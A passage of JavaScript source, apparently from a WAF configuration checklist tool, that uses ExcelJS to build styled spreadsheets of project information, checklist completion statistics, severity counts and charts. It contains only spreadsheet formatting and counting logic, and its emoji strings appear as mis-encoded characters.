    separatorRow.height = 6;
    worksheet.mergeCells('A3:G3');
    separatorRow.getCell(1).fill = {
        type: 'gradient',
        gradient: 'angle',
        degree: 90,
        stops: [
            {position: 0, color: {argb: 'FFFFFFFF'}},
            {position: 0.5, color: {argb: 'FF16A34A'}},
            {position: 1, color: {argb: 'FFFFFFFF'}}
        ]
    };
    
    worksheet.addRow([]);
    
    // Add project information with enhanced styling
    if (currentProject) {
        // Add section header with background
        const projectHeaderRow = worksheet.addRow(['Project Information']);
        projectHeaderRow.font = { bold: true, size: 16 };
        worksheet.mergeCells(`A5:G5`);
        projectHeaderRow.getCell(1).fill = { 
            type: 'pattern', 
            pattern: 'solid', 
            fgColor: { argb: 'E2EFDA' } 
        };
        projectHeaderRow.height = 30;
        projectHeaderRow.alignment = { horizontal: 'left', vertical: 'middle' };
        
        // Add project info table with nicer formatting
        worksheet.addRow([]);
        
        const infoTable = [
            ['Project Name:', currentProject.name || 'Unnamed Project'],
            ['Environment Target:', currentProject.target || 'N/A'],
            ['Start Date:', formatDate(currentProject.date)],
            ['Security Engineer:', currentProject.tester || 'N/A'],
            ['Last Updated:', formatDate(currentProject.lastUpdated)],
            ['Protected Applications:', currentProject.scope || 'N/A']
        ];
        
        // Add project info with alternating row colors
        infoTable.forEach((row, i) => {
            const dataRow = worksheet.addRow(row);
            
            // Style header cell
            dataRow.getCell(1).font = { bold: true };
            
            // Add alternating row colors
            if (i % 2 === 0) {
                dataRow.eachCell((cell) => {
                    cell.fill = { 
                        type: 'pattern', 
                        pattern: 'solid', 
                        fgColor: { argb: 'F2F6FC' } 
                    };
                });
            }
        });
    }
    
    worksheet.addRow([]);
    worksheet.addRow([]);
    
    // Add completion statistics header with enhanced styling
    const statsHeaderRow = worksheet.addRow(['Completion Statistics']);
    statsHeaderRow.font = { bold: true, size: 16 };
    worksheet.mergeCells(`A${statsHeaderRow.number}:G${statsHeaderRow.number}`);
    statsHeaderRow.getCell(1).fill = { 
        type: 'pattern', 
        pattern: 'solid', 
        fgColor: { argb: 'DDEBF7' } 
    };
    statsHeaderRow.height = 30;
    statsHeaderRow.alignment = { horizontal: 'left', vertical: 'middle' };
    
    worksheet.addRow([]);
    
    // Add headers with nicer styling
    const headerRow = worksheet.addRow([
        'Category',
        'Priority',
        'Completion',
        'Critical Items',
        'High Items',
        'Medium Items',
        'Total Items'
    ]);
    
    // Style header row with gradient
    headerRow.eachCell(cell => {
        cell.font = { bold: true, color: { argb: 'FFFFFF' } };
        cell.fill = {
            type: 'gradient',
            gradient: 'angle',
            degree: 90,
            stops: [
                {position: 0, color: {argb: 'FF4472C4'}},
                {position: 1, color: {argb: 'FF2B5692'}}
            ]
        };
        cell.border = {
            top: { style: 'thin' },
            left: { style: 'thin' },
            bottom: { style: 'thin' },
            right: { style: 'thin' }
        };
        cell.alignment = { horizontal: 'center', vertical: 'middle' };
    });
    headerRow.height = 26;
    
    // Calculate statistics for each category
    let overallTotal = 0;
    let overallComplete = 0;
    
    appwallData.categories.forEach((category, index) => {
        // Count items by priority
        let critical = 0;
        let high = 0;
        let medium = 0;
        let total = 0;
        let completed = 0;
        
        category.checklist.forEach(group => {
            group.items.forEach(item => {
                total++;
                overallTotal++;
                
                // Count by priority
                if (item.priority === 'critical') critical++;
                else if (item.priority === 'high') high++;
                else if (item.priority === 'medium') medium++;
                
                // Check completion status
                if (currentProject && 
                    currentProject.taskStatus && 
                    currentProject.taskStatus[item.id] === TASK_STATUS.PASSED) {
                    completed++;
                    overallComplete++;
                }
            });
        });
        
        // Calculate completion percentage
        const completionPercent = Math.round((completed / total) * 100) || 0;
        
        // Add category data with alternating row colors
        const dataRow = worksheet.addRow([
            category.title,
            capitalizeFirstLetter(category.priority),
            completionPercent + '%',
            critical,
            high,
            medium,
            total
        ]);
        
        // Style the row
        dataRow.eachCell((cell, colNumber) => {
            // Add borders
            cell.border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
            
            // Alternating row colors
            cell.fill = {
                type: 'pattern',
                pattern: 'solid',
                fgColor: { argb: index % 2 === 0 ? 'F5F8FC' : 'FFFFFF' }
            };
            
            // Center all cells except the first one
            if (colNumber > 1) {
                cell.alignment = { horizontal: 'center' };
            }
            
            // Enhanced completion percentage styling with color coding
            if (colNumber === 3) {
                // Add color-coded completion percentage with more nuanced colors
                if (completionPercent < 20) {
                    cell.font = { color: { argb: 'FFFFFF' } };
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'C00000' } // Dark red
                    };
                } else if (completionPercent < 40) {
                    cell.font = { color: { argb: 'FFFFFF' } };
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FF4E4E' } // Medium red
                    };
                } else if (completionPercent < 60) {
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FFEB84' } // Yellow
                    };
                } else if (completionPercent < 80) {
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'C6E0B4' } // Light green
                    };
                } else {
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: '70AD47' } // Dark green
                    };
                    cell.font = { color: { argb: 'FFFFFF' } };
                }
            }
            
            // Priority column styling
            if (colNumber === 2) {
                if (category.priority === 'critical') {
                    cell.font = { color: { argb: 'C00000' } }; // Dark red
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FFDEDE' } // Light red background
                    };
                } else if (category.priority === 'high') {
                    cell.font = { color: { argb: 'FF6600' } }; // Orange
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FFEBD0' } // Light orange background
                    };
                } else if (category.priority === 'medium') {
                    cell.font = { color: { argb: '997300' } }; // Dark yellow
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'FFF8D0' } // Light yellow background
                    };
                }
            }
        });
    });
    
    // Add overall statistics with enhanced styling
    const overallPercent = Math.round((overallComplete / overallTotal) * 100) || 0;
    
    worksheet.addRow([]);
    
    const overallRow = worksheet.addRow([
        'OVERALL COMPLETION',
        '',
        overallPercent + '%',
        '',
        '',
        '',
        overallTotal
    ]);
    
    // Style overall row with special highlighting
    overallRow.eachCell((cell, colNumber) => {
        cell.font = { bold: true };
        cell.border = {
            top: { style: 'double' },
            left: { style: 'thin' },
            bottom: { style: 'double' },
            right: { style: 'thin' }
        };
        
        // Add gradient background
        cell.fill = {
            type: 'gradient',
            gradient: 'angle',
            degree: 90,
            stops: [
                {position: 0, color: {argb: 'FFEFF7FC'}},
                {position: 1, color: {argb: 'FFCFE9FC'}}
            ]
        };
        
        if (colNumber === 3) {
            cell.alignment = { horizontal: 'center' };
            
            // Style based on overall completion
            if (overallPercent < 30) {
                cell.font = { bold: true, color: { argb: 'FFFFFF' } };
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: 'C00000' } // Dark red
                };
            } else if (overallPercent < 70) {
                cell.font = { bold: true, color: { argb: '000000' } };
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: 'FFEB84' } // Yellow
                };
            } else {
                cell.font = { bold: true, color: { argb: 'FFFFFF' } };
                cell.fill = {
                    type: 'pattern',
                    pattern: 'solid',
                    fgColor: { argb: '70AD47' } // Dark green
                };
            }
        }
        
        if (colNumber === 7) {
            cell.alignment = { horizontal: 'center' };
        }
    });
    overallRow.height = 30;
    
    // Add findings summary if there are findings
    if (appwallData.findings && appwallData.findings.length > 0) {
        worksheet.addRow([]);
        worksheet.addRow([]);
        
        // Add findings header with enhanced styling
        const findingsHeaderRow = worksheet.addRow(['Configuration Issues Summary']);
        findingsHeaderRow.font = { bold: true, size: 16 };
        worksheet.mergeCells(`A${findingsHeaderRow.number}:G${findingsHeaderRow.number}`);
        findingsHeaderRow.getCell(1).fill = { 
            type: 'pattern', 
            pattern: 'solid', 
            fgColor: { argb: 'FCE4E4' } 
        };
        findingsHeaderRow.height = 30;
        findingsHeaderRow.alignment = { horizontal: 'left', vertical: 'middle' };
        
        worksheet.addRow([]);
        
        // Add finding statistics
        const highCount = appwallData.findings.filter(f => f.severity === 'high').length;
        const mediumCount = appwallData.findings.filter(f => f.severity === 'medium').length;
        const lowCount = appwallData.findings.filter(f => f.severity === 'low').length;
        const infoCount = appwallData.findings.filter(f => f.severity === 'info').length;
        
        const findingsTable = [
            ['High Severity Issues:', highCount, 'ð´ Requires immediate attention'],
            ['Medium Severity Issues:', mediumCount, 'ð  Should be addressed soon'],
            ['Low Severity Issues:', lowCount, 'ð¡ Plan for future remediation'],
            ['Informational:', infoCount, 'â¹ï¸ For awareness only'],
            ['Total Issues:', appwallData.findings.length, '']
        ];
        
        findingsTable.forEach((row, i) => {
            const dataRow = worksheet.addRow(row);
            dataRow.getCell(1).font = { bold: true };
            
            // Style count cell
            dataRow.getCell(2).alignment = { horizontal: 'center' };
            
            // Add alternating row colors
            if (i % 2 === 0) {
                dataRow.eachCell((cell) => {
                    cell.fill = { 
                        type: 'pattern', 
                        pattern: 'solid', 
                        fgColor: { argb: 'FDF8F0' } 
                    };
                });
            }
            
            // Style based on severity
            if (row[0].includes('High')) {
                dataRow.getCell(2).font = { color: { argb: 'C00000' }, bold: true };
            } else if (row[0].includes('Medium')) {
                dataRow.getCell(2).font = { color: { argb: 'ED7D31' } };
            } else if (row[0].includes('Low')) {
                dataRow.getCell(2).font = { color: { argb: 'FFC000' } };
            } else if (row[0].includes('Total')) {
                dataRow.getCell(2).font = { bold: true };
                dataRow.eachCell(cell => {
                    cell.border = {
                        top: { style: 'thin' },
                        bottom: { style: 'double' }
                    };
                });
            }
        });
    }
    
    // Set column widths
    worksheet.getColumn(1).width = 35; // Category
    worksheet.getColumn(2).width = 15; // Priority
    worksheet.getColumn(3).width = 15; // Completion
    worksheet.getColumn(4).width = 15; // Critical
    worksheet.getColumn(5).width = 15; // High
    worksheet.getColumn(6).width = 15; // Medium
    worksheet.getColumn(7).width = 15; // Total
    
    // Add footer with document information
    const footerRowIndex = worksheet.rowCount + 3;
    const footerRow = worksheet.addRow(['Document generated by Radware AppWall WAF Configuration Checklist Tool']);
    worksheet.mergeCells(`A${footerRowIndex}:G${footerRowIndex}`);
    footerRow.getCell(1).font = { italic: true, color: { argb: '888888' } };
    footerRow.getCell(1).alignment = { horizontal: 'center' };
}

// Create charts worksheet with Excel-native charts
function createChartsWorksheet(worksheet) {
    // Set up title
    const titleRow = worksheet.addRow(['WAF Configuration Charts & Visualizations']);
    titleRow.font = { bold: true, size: 18 };
    titleRow.height = 36;
    
    // Merge cells for the title
    worksheet.mergeCells('A1:J1');
    titleRow.alignment = { horizontal: 'center', vertical: 'middle' };
    
    // Style the title with gradient fill
    titleRow.getCell(1).fill = {
        type: 'gradient',
        gradient: 'angle',
        degree: 90,
        stops: [
            {position: 0, color: {argb: 'FF7030A0'}},
            {position: 1, color: {argb: 'FFADA0D1'}}
        ]
    };
    titleRow.getCell(1).font = { bold: true, size: 18, color: { argb: 'FFFFFF' } };
    
    worksheet.addRow([]);
    
    // --- Prepare data for charts ---
    
    // Category completion data
    const categoryData = [];
    appwallData.categories.forEach(category => {
        let total = 0;
        let completed = 0;
        
        category.checklist.forEach(group => {
            group.items.forEach(item => {
                total++;
                
                // Check completion status
                if (currentProject && 
                    currentProject.taskStatus && 
                    currentProject.taskStatus[item.id] === TASK_STATUS.PASSED) {
                    completed++;
                }
            });
        });
        
        const completionPercent = Math.round((completed / total) * 100) || 0;
        
        categoryData.push({
            name: category.title,
            percent: completionPercent,
            completed: completed,
            total: total
        });
    });
    
    // Priority counts
    let criticalTotal = 0, criticalCompleted = 0;
    let highTotal = 0, highCompleted = 0;
    let mediumTotal = 0, mediumCompleted = 0;
    let lowTotal = 0, lowCompleted = 0;
    
    appwallData.categories.forEach(category => {
        category.checklist.forEach(group => {
            group.items.forEach(item => {
                if (item.priority === 'critical') {
                    criticalTotal++;
                    if (currentProject?.taskStatus?.[item.id] === TASK_STATUS.PASSED) {
                        criticalCompleted++;
                    }
                } else if (item.priority === 'high') {
                    highTotal++;
                    if (currentProject?.taskStatus?.[item.id] === TASK_STATUS.PASSED) {
                        highCompleted++;
                    }
                } else if (item.priority === 'medium') {
                    mediumTotal++;
                    if (currentProject?.taskStatus?.[item.id] === TASK_STATUS.PASSED) {
                        mediumCompleted++;
                    }
                } else {
                    lowTotal++;
                    if (currentProject?.taskStatus?.[item.id] === TASK_STATUS.PASSED) {
                        lowCompleted++;
                    }
                }
            });
        });
    });
    
    // Findings by severity
    const highFindings = appwallData.findings.filter(f => f.severity === 'high').length;
    const mediumFindings = appwallData.findings.filter(f => f.severity === 'medium').length;
    const lowFindings = appwallData.findings.filter(f => f.severity === 'low').length;
    const infoFindings = appwallData.findings.filter(f => f.severity === 'info').length;
    
    // --- Category Completion Chart ---
    
    // Add section header
    const catChartHeaderRow = worksheet.addRow(['Category Completion Status']);
    catChartHeaderRow.font = { bold: true, size: 14 };
    catChartHeaderRow.getCell(1).fill = { 
        type: 'pattern', 
        pattern: 'solid', 
        fgColor: { argb: 'E1D3F4' } 
    };
    worksheet.mergeCells(`A3:J3`);
    
    // Add a row for spacing
    worksheet.addRow([]);
    
    // Start row for the chart
    const catChartStartRow = 5;
    
    // Add headers
    const catHeaders = worksheet.addRow(['Category', 'Completion %']);
    catHeaders.eachCell(cell => {
        cell.font = { bold: true };
        cell.fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: 'D9D9D9' }
        };
    });
    
    // Add data rows
    categoryData.forEach(cat => {
        worksheet.addRow([cat.name, cat.percent / 100]); // Excel needs decimals for percentages
    });
    
    // Calculate the end row
    const catChartEndRow = catChartStartRow + categoryData.length;
    
    // Add the chart
    const catChart = worksheet.addChart(ExcelJS.ValueType.Column, {
        title: { name: 'Category Completion Percentages' },
        legend: { position: 'right' },
        plotArea: {
            catAxis: {
                title: { name: 'Category' },
                tickLabelSkip: 1,
                tickMarkSkip: 1
            },
            valAxis: {
                min: 0,
                max: 1,
                tickLabelFormat: '0%',
                title: { name: 'Completion Percentage' }
            }
        },
        dataLabel: {
            showValue: true,
            showPercent: true,
            position: 'center',
            formatCode: '0%'
        },
        showDataTable: true,
        showBorder: true,
        noMultiLevelLabels: true
    });
    
    catChart.addSeries({
        name: 'Completion',
        categoryRef: `A${catChartStartRow + 1}:A${catChartEndRow}`,
        xvalues: `A${catChartStartRow + 1}:A${catChartEndRow}`,
        values: `B${catChartStartRow + 1}:B${catChartEndRow}`,
        border: { color: '#007ACC' },
        fill: { color: '#4472C4' }
    });
    
    // Make the chart larger and anchor it on the worksheet
    catChart.width = 600;
    catChart.height = 400;
    catChart.position = {
        offsetX: 10,
        offsetY: catChartEndRow + 2,
    };
    
    worksheet.addChart(catChart);
    
    // Add rows to account for the chart
    for (let i = 0; i < 22; i++) {
        worksheet.addRow([]);
    }
    
    // --- Priority Completion Chart ---
    
    // Add section header
    const prioChartHeaderRow = worksheet.addRow(['Completion by Priority']);
    prioChartHeaderRow.font = { bold: true, size: 14 };
    prioChartHeaderRow.getCell(1).fill = { 
        type: 'pattern', 
        pattern: 'solid', 
        fgColor: { argb: 'E1D3F4' } 
    };
    worksheet.mergeCells(`A${prioChartHeaderRow.number}:J${prioChartHeaderRow.number}`);
    
    // Add a row for spacing
    worksheet.addRow([]);
    
    // Start row for the priority chart
    const prioChartStartRow = worksheet.rowCount;
    
    // Add headers
    const prioHeaders = worksheet.addRow(['Priority', 'Completed', 'Incomplete']);
    prioHeaders.eachCell(cell => {
        cell.font = { bold: true };
        cell.fill = {
            type: 'pattern',
            pattern: 'solid',
            fgColor: { argb: 'D9D9D9' }
        };
    });
    
    // Add data rows
    worksheet.addRow(['Critical', criticalCompleted, criticalTotal - criticalCompleted]);
    worksheet.addRow(['High', highCompleted, highTotal - highCompleted]);
    worksheet.addRow(['Medium', mediumCompleted, mediumTotal - mediumCompleted]);
    worksheet.addRow(['Low', lowCompleted, lowTotal - lowCompleted]);
    
    // Calculate the end row
    const prioChartEndRow = prioChartStartRow + 4;
    
    // Add the stacked column chart
    const prioChart = worksheet.addChart(ExcelJS.ValueType.Column, {
        title: { name: 'Task Completion by Priority' },
        legend: { position: 'right' },
        plotArea: {
            catAxis: { title: { name: 'Priority Level' } },
            valAxis: { title: { name: 'Number of Tasks' } }
        },
        barDir: 'col',
        showBorder: true,
        grouping: 'stacked'
    });
    
    // Add completed series
    prioChart.addSeries({
        name: 'Completed',
        categoryRef: `A${prioChartStartRow + 1}:A${prioChartEndRow}`,
        xvalues: `A${prioChartStartRow + 1}:A${prioChartEndRow}`,
        values: `B${prioChartStartRow + 1}:B${prioChartEndRow}`,
        border: { color: '#375623' },
        fill: { color: '#70AD47' }
    });
    
    // Add incomplete series
    prioChart.addSeries({
        name: 'Incomplete',
        categoryRef: `A${prioChartStartRow + 1}:A${prioChartEndRow}`,
        xvalues: `A${prioChartStartRow + 1}:A${prioChartEndRow}`,
        values: `C${prioChartStartRow + 1}:C${prioChartEndRow}`,
        border: { color: '#803030' },
        fill: { color: '#C00000' }
    });
    
    // Size and position the chart
    prioChart.width = 600;
    prioChart.height = 400;
    prioChart.position = {
        offsetX: 10,
        offsetY: prioChartEndRow + 2,
    };
    
    worksheet.addChart(prioChart);
    
    // Add rows to account for the chart
    for (let i = 0; i < 22; i++) {
        worksheet.addRow([]);
    }
    
    // --- Findings Severity Chart ---
    
    // Only add findings chart if there are findings
    if (appwallData.findings && appwallData.findings.length > 0) {
        // Add section header
        const findingsHeaderRow = worksheet.addRow(['Configuration Issues by Severity']);
        findingsHeaderRow.font = { bold: true, size: 14 };
        findingsHeaderRow.getCell(1).fill = { 
            type: 'pattern', 
            pattern: 'solid', 
            fgColor: { argb: 'E1D3F4' } 
        };
        worksheet.mergeCells(`A${findingsHeaderRow.number}:J${findingsHeaderRow.number}`);
        
        // Add a row for spacing
        worksheet.addRow([]);
        
        // Start row for the findings chart
        const findingsChartStartRow = worksheet.rowCount;
        
        // Add headers
        const findingsHeaders = worksheet.addRow(['Severity', 'Count']);
        findingsHeaders.eachCell(cell => {
            cell.font = { bold: true };
            cell.fill = {
                type: 'pattern',
                pattern: 'solid',
                fgColor: { argb: 'D9D9D9' }
            };
        });
        
        // Add data rows
        worksheet.addRow(['High', highFindings]);
        worksheet.addRow(['Medium', mediumFindings]);
        worksheet.addRow(['Low', lowFindings]);
        worksheet.addRow(['Info', infoFindings]);
        
        // Calculate the end row
        const findingsChartEndRow = findingsChartStartRow + 4;
        
        // Add the pie chart
        const findingsChart = worksheet.addChart(ExcelJS.ValueType.Pie, {
            title: { name: 'Configuration Issues by Severity' },
            legend: { position: 'right' },
            dataLabel: {
                showValue: false,
                showPercent: true,
                showLeaderLines: true,
                showCatName: true,
                position: 'bestFit'
            },
            showBorder: true
        });
        
        // Add the series
        findingsChart.addSeries({
            name: 'Issues',
            categoryRef: `A${findingsChartStartRow + 1}:A${findingsChartEndRow}`,
            xvalues: `A${findingsChartStartRow + 1}:A${findingsChartEndRow}`,
            values: `B${findingsChartStartRow + 1}:B${findingsChartEndRow}`,
            border: { color: '#000000' }
        });
        
        // Size and position the chart
        findingsChart.width = 500;
        findingsChart.height = 400;
        findingsChart.position = {
            offsetX: 10,
            offsetY: findingsChartEndRow + 2,
        };
        
        worksheet.addChart(findingsChart);
    }
    
    // Widen the columns
    worksheet.getColumn(1).width = 35;
    worksheet.getColumn(2).width = 15;
    worksheet.getColumn(3).width = 15;
}

// Create an enhanced category worksheet
function createEnhancedCategoryWorksheet(worksheet, category, includeTechniques, includeNotes) {
    // Add attractive header with category icon (text based)
    const iconMap = {
        'fa-server': 'ð¥ï¸',
        'fa-sitemap': 'ð',
        'fa-shield-alt': 'ð¡ï¸',
        'fa-lock': 'ð',
        'fa-tachometer-alt': 'â¡',
        'fa-chart-line': 'ð',
        'fa-plug': 'ð',
        'fa-user-shield': 'ð¤',
        'fa-cogs': 'âï¸'
    };
    const categoryIcon = iconMap[category.icon] || 'ð';
    
    // Add title with icon
    const titleRow = worksheet.addRow([`${categoryIcon} ${category.title}`]);
    titleRow.font = { bold: true, size: 16 };
    worksheet.mergeCells(`A1:E1`);
    titleRow.alignment = { horizontal: 'center', vertical: 'middle' };
    titleRow.height = 30;
    
    // Style the title with gradient fill based on priority
    let gradientColors;
    if (category.priority === 'critical') {
        gradientColors = [{position: 0, color: {argb: 'FFC00000'}}, {position: 1, color: {argb: 'FFFF9999'}}];
    } else if (category.priority === 'high') {
        gradientColors = [{position: 0, color: {argb: 'FFED7D31'}}, {position: 1, color: {argb: 'FFFFC000'}}];
    } else if (category.priority === 'medium') {
        gradientColors = [{position: 0, color: {argb: 'FFFFC000'}}, {position: 1, color: {argb: 'FFFFFF00'}}];
    } else {
        gradientColors = [{position: 0, color: {argb: 'FF70AD47'}}, {position: 1, color: {argb: 'FFA9D18E'}}];
    }
    
    titleRow.getCell(1).fill = {
        type: 'gradient',
        gradient: 'angle',
        degree: 90,
        stops: gradientColors
    };
    titleRow.getCell(1).font = { bold: true, size: 16, color: { argb: 'FFFFFF' } };
    
    // Add the category subtitle
    const subtitleRow = worksheet.addRow([category.subtitle]);
    subtitleRow.font = { italic: true };
    worksheet.mergeCells(`A2:E2`);
    subtitleRow.alignment = { horizontal: 'center' };
    
    worksheet.addRow([]);
    
    // Add priority information with visual indicator
    let priorityText, priorityColor;
    if (category.priority === 'critical') {
        priorityText = 'ð´ Critical Priority';
        priorityColor = 'FF0000';
    } else if (category.priority === 'high') {
        priorityText = 'ð  High Priority';
        priorityColor = 'FF6600';
    } else if (category.priority === 'medium') {
        priorityText = 'ð¡ Medium Priority';
        priorityColor = 'FFCC00';
    } else {
        priorityText = 'ð¢ Low Priority';
        priorityColor = '70AD47';
    }
    
    const priorityRow = worksheet.addRow([priorityText]);
    priorityRow.font = { bold: true, color: { argb: priorityColor } };
    priorityRow.height = 24;
    
    worksheet.addRow([]);
    
    // Add completion summary
    let total = 0;
    let completed = 0;
    let critical = 0;
    let criticalCompleted = 0;
    
    category.checklist.forEach(group => {
        group.items.forEach(item => {
            total++;
            if (item.priority === 'critical') critical++;
            
            // Check completion status
            if (currentProject && 
                currentProject.taskStatus && 
                currentProject.taskStatus[item.id] === TASK_STATUS.PASSED) {
                completed++;
                if (item.priority === 'critical') criticalCompleted++;
            }
        });
    });
    
    const completionPercent = Math.round((completed / total) * 100) || 0;
    const criticalPercent = critical > 0 ? Math.round((criticalCompleted / critical) * 100) : 100;
    
    const summaryRow = worksheet.addRow([`Category Completion: ${completionPercent}% (${completed}/${total} items) | Critical Items: ${criticalPercent}% (${criticalCompleted}/${critical} items)`]);
    worksheet.mergeCells(`A6:E6`);
    summaryRow.getCell(1).font = { bold: true };
    
    // Add progress bar
    const progressRow = worksheet.addRow(['']);
    worksheet.mergeCells(`A7:E7`);
    progressRow.height = 6;
    
    // Create a gradient-like progress bar by coloring cells
    const cell = progressRow.getCell(1);
    
    // Set progress bar fill color based on completion
    let progressColor;
    if (completionPercent < 30) {
        progressColor = 'FF4D4D';
    } else if (completionPercent < 70) {
        progressColor = 'FFDD00';
    } else {
        progressColor = '70AD47';
    }
    
    // Semi-fake progress bar with gradient
    cell.fill = {
        type: 'gradient',
        gradient: 'path',
        center: { left: 0, top: 0 },
        stops: [
            {position: 0, color: {argb: progressColor}},
            {position: completionPercent/100, color: {argb: progressColor}},
            {position: completionPercent/100 + 0.001, color: {argb: 'EDEDED'}},
            {position: 1, color: {argb: 'EDEDED'}}
        ]
    };
    
    worksheet.addRow([]);
    
    // Add each checklist group with enhanced styling
    let currentRow = 9;
    
    category.checklist.forEach((group, groupIndex) => {
        // Add group title with icon from group.icon
        const groupIcon = iconMap[group.icon] || 'ð';
        const groupRow = worksheet.addRow([`${groupIcon} ${group.title}`]);
        groupRow.font = { bold: true, size: 14 };
        worksheet.mergeCells(`A${currentRow}:E${currentRow}`);
        
        // Add stylish group header
        groupRow.getCell(1).fill = {
            type: 'gradient',
            gradient: 'angle',
            degree: 90,
            stops: [
                {position: 0, color: {argb: 'FFE6F0FF'}},
                {position: 1, color: {argb: 'FFB3D1FF'}}
            ]
        };
        groupRow.height = 26;
        
        currentRow++;
        
        // Add column headers with enhanced styling
        const headerRow = worksheet.addRow(['Item ID', 'Task', 'Priority', 'Status', 'Notes']);
        headerRow.eachCell(cell => {
            cell.font = { bold: true, color: { argb: 'FFFFFF' } };
            cell.fill = {
                type: 'gradient',
                gradient: 'angle',
                degree: 90,
                stops: [
                    {position: 0, color: {argb: 'FF4472C4'}},
                    {position: 1, color: {argb: 'FF2B5692'}}
                ]
            };
            cell.border = {
                top: { style: 'thin' },
                left: { style: 'thin' },
                bottom: { style: 'thin' },
                right: { style: 'thin' }
            };
            cell.alignment = { horizontal: 'center', vertical: 'middle' };
        });
        headerRow.height = 24;
        
        currentRow++;
        
        // Add items with prettier styling
        group.items.forEach((item, itemIndex) => {
            // Get task status
            let status = "Not Started";
            let statusClass = "NotStarted";
            
            if (currentProject && currentProject.taskStatus) {
                if (currentProject.taskStatus[item.id] === TASK_STATUS.PASSED) {
                    status = "Completed";
                    statusClass = "Completed";
                } else if (currentProject.taskStatus[item.id] === TASK_STATUS.NA) {
                    status = "Not Applicable";
                    statusClass = "NA";
                }
            }
            
            // Add the item row with alternating colors
            const itemRow = worksheet.addRow([
                item.id,
                item.text,
                capitalizeFirstLetter(item.priority),
                status,
                '' // Notes column
            ]);
            
            // Style with alternating row colors
            itemRow.eachCell((cell, colNumber) => {
                // Add borders
                cell.border = {
                    top: { style: 'thin' },
                    left: { style: 'thin' },
                    bottom: { style: 'thin' },
                    right: { style: 'thin' }
                };
                
                // Add subtle alternating row colors
                if (itemIndex % 2 === 0) {
                    cell.fill = {
                        type: 'pattern',
                        pattern: 'solid',
                        fgColor: { argb: 'F9FBFF' }
                    };
                }
                
                // Priority cell styling
                if (colNumber === 3) {
                    cell.alignment = { horizontal: 'center' };
                    
                    // More distinctive priority styling
                    if (item.priority === 'critical') {
                        cell.font = { color: { argb: 'FFFFFF' } };
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'C00000' } // Dark red
                        };
                    } else if (item.priority === 'high') {
                        cell.font = { color: { argb: 'FFFFFF' } };
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'ED7D31' } // Orange
                        };
                    } else if (item.priority === 'medium') {
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'FFCC00' } // Yellow
                        };
                    } else {
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: '70AD47' } // Green
                        };
                        cell.font = { color: { argb: 'FFFFFF' } };
                    }
                }
                
                // Status cell with icon and color
                if (colNumber === 4) {
                    cell.alignment = { horizontal: 'center' };
                    
                    // Enhanced status styling
                    if (status === "Completed") {
                        cell.value = "â Completed";
                        cell.font = { color: { argb: '006100' } };
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'E2EFDA' } // Light green
                        };
                    } else if (status === "Not Applicable") {
                        cell.value = "N/A";
                        cell.font = { color: { argb: '808080' } };
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'EDEDED' } // Light gray
                        };
                    } else {
                        cell.value = "â¬ Not Started";
                        cell.font = { color: { argb: 'BF0000' } };
                        cell.fill = {
                            type: 'pattern',
                            pattern: 'solid',
                            fgColor: { argb: 'FFF0F0' } // Light red
                        };
                    }
                }
            });
            
            currentRow++;
        });
        
        // Add an empty row after each group
        worksheet.addRow([]);
        currentRow++;
    });
    
    // Add techniques section if requested and available
    if (includeTechniques && category.techniques && category.techniques.length > 0) {
        const techHeaderRow = worksheet.addRow(['Configuration Techniques & Commands']);
        techHeaderRow.font = { bold: true, size: 14 };
        techHeaderRow.getCell(1).fill = {
            type: 'gradient',
            gradient: 'angle',
            degree: 90,
            stops: [
                {position: 0, color: {argb: 'FFF2F2F2'}},
                {position: 1, color: {argb: 'FFD9D9D9'}}
            ]
        };
        worksheet.mergeCells(`A${currentRow}:E${currentRow}`);
        techHeaderRow.height = 24;
        
        currentRow++;
        
        worksheet.addRow([]);
        currentRow++;
        
        // Add each technique
        category.techniques.forEach((technique, index) => {
            // Create a nice header for each technique
            const techTitleRow = worksheet.addRow([`âï¸ ${technique.title}`]);
            techTitleRow.font = { bold: true };
            worksheet.mergeCells(`A${currentRow}:E${currentRow}`);
            techTitleRow.getCell(1).fill = {
                type: 'pattern',
                pattern: 'solid',
                fgColor: { argb: 'E6E6E6' } // Light gray
            };
            techTitleRow.height = 22;
            
            currentRow++;
            
            // Extract text content from HTML (simplified approach)
            const content = technique.content
                ? technique.content.replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim()
                : 'No detailed content available';
            
            const contentRow = worksheet.addRow([content]);
            worksheet.mergeCells(`A${currentRow}:E${currentRow}`);
            contentRow.getCell(1).alignment = { wrapText: true };
            contentRow.height = 80;
            
            currentRow++;
            
            // Extract code blocks if present
            const codeBlocks = extractCodeBlocks(technique.content);
            if (codeBlocks.length > 0) {
                worksheet.addRow(['Configuration Commands:']);
                currentRow++;
                
                codeBlocks.forEach(codeBlock => {
                    const codeRow = worksheet.addRow([codeBlock]);
                    worksheet.mergeCells(`A${currentRow}:E${currentRow}`);
                    codeRow.getCell(1).alignment = { wrapText: true };
                    codeRow.getCell(1).font = { name: 'Consolas', size: 10 };
                    codeRow.getCell(1).fill = {
                        type: 'pattern',
                        pattern: 'solid',
